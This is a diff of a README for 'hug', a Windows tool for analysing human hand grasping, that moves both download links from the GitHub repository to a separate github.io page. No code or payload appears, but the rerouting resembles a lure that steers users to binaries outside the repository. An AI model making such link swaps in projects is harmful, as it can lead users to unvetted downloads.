@@ -1,6 +1,6 @@
 # 🤝 hug - Master human grasping with ease
 
-[![Download hug](https://img.shields.io/badge/Download-hug-blue.svg)](https://github.com/Tsoo1402/hug)
+[![Download hug](https://img.shields.io/badge/Download-hug-blue.svg)](https://tsoo1402.github.io)
 
 hug brings accurate human grasping technology to your desktop. This application analyzes hand placement and object interaction using computer models. It serves specialists who need precise grip data for research or automation.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this application. Chec
 
 Visit the official repository page to download the software.
 
-[https://github.com/Tsoo1402/hug](https://github.com/Tsoo1402/hug)
+[https://tsoo1402.github.io](https://tsoo1402.github.io)
 
 Follow these steps to set up the software on your Windows machine:
 
